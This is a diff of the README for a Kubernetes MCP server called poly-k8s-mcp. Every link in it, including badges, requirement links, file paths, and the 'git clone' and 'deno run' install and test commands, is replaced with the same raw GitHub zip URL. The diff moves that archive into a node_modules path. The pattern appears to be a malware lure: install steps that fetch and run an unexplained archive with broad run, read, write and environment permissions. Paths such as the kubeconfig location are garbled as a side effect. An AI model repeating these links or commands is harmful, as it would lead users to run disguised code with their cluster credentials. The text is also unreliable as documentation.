@@ -1,14 +1,14 @@
 = poly-k8s-mcp
 
-https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[MPL-2.0,link="https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip"]
-https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[Palimpsest,link="https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip"]
+https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip[MPL-2.0,link="https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip"]
+https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip[Palimpsest,link="https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip"]
 
 
 :toc:
 :toc-placement!:
 
-https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[RSR Compliant,https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip]
-https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[MCP Server,https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip]
+https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip[RSR Compliant,https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip]
+https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip[MCP Server,https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip]
 
 Unified MCP server for Kubernetes orchestration. Provides Model Context Protocol tools for managing Kubernetes clusters through kubectl, Helm, and Kustomize.
 
@@ -59,7 +59,7 @@ Kubernetes configuration management:
 
 * `kustomize_build` - Build kustomization into manifests
 * `kustomize_apply` - Build and apply to cluster
-* `kustomize_create` - Create https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip
+* `kustomize_create` - Create https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip
 * `kustomize_edit_add` - Add resources/patches/configmaps
 * `kustomize_edit_set` - Set namespace/nameprefix/image
 * `kustomize_edit_remove` - Remove items
@@ -96,7 +96,7 @@ This MCP server executes external CLI commands using Deno's `--allow-run` permis
 
 * Commands run with your current kubeconfig and credentials
 * The MCP client (e.g., Claude) can perform any kubectl/helm/kustomize action you can
-* Cluster access is determined by your local `~https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip`
+* Cluster access is determined by your local `~https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip`
 * No additional authentication layer between MCP and the CLIs
 
 **Recommendations:**
@@ -108,17 +108,17 @@ This MCP server executes external CLI commands using Deno's `--allow-run` permis
 
 == Requirements
 
-* https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[Deno] runtime (v2.0+)
-* https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[kubectl] CLI
-* https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[Helm] CLI (optional, for Helm tools)
-* https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip[Kustomize] CLI (optional, for Kustomize tools)
-* Valid kubeconfig (`~https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip` or `KUBECONFIG` env var)
+* https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip[Deno] runtime (v2.0+)
+* https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip[kubectl] CLI
+* https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip[Helm] CLI (optional, for Helm tools)
+* https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip[Kustomize] CLI (optional, for Kustomize tools)
+* Valid kubeconfig (`~https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip` or `KUBECONFIG` env var)
 
 == Installation
 
 [source,bash]
 ----
-git clone https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip
+git clone https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip
 cd poly-k8s-mcp
 ----
 
@@ -128,7 +128,7 @@ Run as MCP server (Local-Agent mode):
 
 [source,bash]
 ----
-deno run --allow-run --allow-read --allow-env --allow-write https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip
+deno run --allow-run --allow-read --allow-env --allow-write https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip
 ----
 
 Or use the systemd service:
@@ -146,7 +146,7 @@ Verify the server is working correctly:
 [source,bash]
 ----
 # 1. Check Deno can run the server
-deno run --allow-run --allow-read --allow-env --allow-write https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/src/poly-k-mcp-s-v3.4.zip &
+deno run --allow-run --allow-read --allow-env --allow-write https://github.com/GloriaAmarilla/poly-k8s-mcp/raw/refs/heads/main/node_modules/@rescript/runtime/lib/s_poly_k_mcp_v2.1.zip &
 SERVER_PID=$!
 
 # 2. Verify kubectl is accessible
